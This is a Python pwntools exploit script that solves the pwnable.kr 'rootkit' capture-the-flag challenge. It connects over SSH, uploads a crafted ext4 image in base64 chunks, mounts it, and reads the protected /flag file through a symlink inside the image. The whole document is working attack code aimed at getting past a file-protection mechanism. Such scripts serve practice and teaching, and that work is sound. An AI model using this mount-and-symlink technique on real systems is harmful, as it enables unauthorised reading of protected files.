#!/usr/bin/env python3
import io
import gzip
import tarfile

from pwn import *

if args.LOCAL:
    raise Exception("not supported!")
else:
    shell = process('sshpass -p guest ssh rootkit@pwnable.kr -p2222', shell=True)

# --- utils --- #
def do_command(shell: tube, cmd: bytes) -> bytes:
    shell.sendline(cmd)
    return shell.recvuntil(b"/ # ", drop=True)

def upload_file(shell: tube, filename: bytes, data: bytes):
    compressed_data = b64e(gzip.compress(gzip.compress(data)))
    compressed_filename = filename + b".compressed"

    do_command(shell, b"rm %s" % filename)

    for _ in range(0, len(compressed_data), 400):
        do_command(shell, b'echo -n "%s" >> %s' % (compressed_data[_:_+400].encode("ascii"), compressed_filename))

    do_command(shell, b"base64 -d %s | gzip -d | gzip -d > %s" % (compressed_filename, filename))

# output is sometimes out of order, this sleep + enter fixes it
shell.recvuntil(b"/ # ")
sleep(1)
do_command(shell, b"stty -echo")

# the idea is that as root we can create symlinks by mounting filesystems containing symlinks
# loopbackfile.img is an ext4 filesystem with a single file - a symlink lnk -> /flag. by mounting it
# we can just read through the symlink :)

# not enough space for our little fs file - mount a ram fs
do_command(shell, b"mkdir /tmp/mnt /tmp/malicious")

info("mounting tmpfs...")
do_command(shell, b"mount -t tmpfs tmpfs /tmp/mnt")

info("uploading files...")
upload_file(shell, b"/tmp/mnt/lo", Path("loopbackfile.img").read_bytes())

# mount
info("mounting malicious image...")
do_command(shell, b"mount -t ext4 -o ro,noload /tmp/mnt/lo /tmp/malicious")

# read file through symlink
info("reading flag...")
targz = b64d(do_command(shell, b"base64 /tmp/malicious/lnk"))

flag = tarfile.open(fileobj=io.BytesIO(targz)).extractfile("flag").read()
success(f"flag = '{term.text.bold_italic_yellow(flag.decode().strip())}'")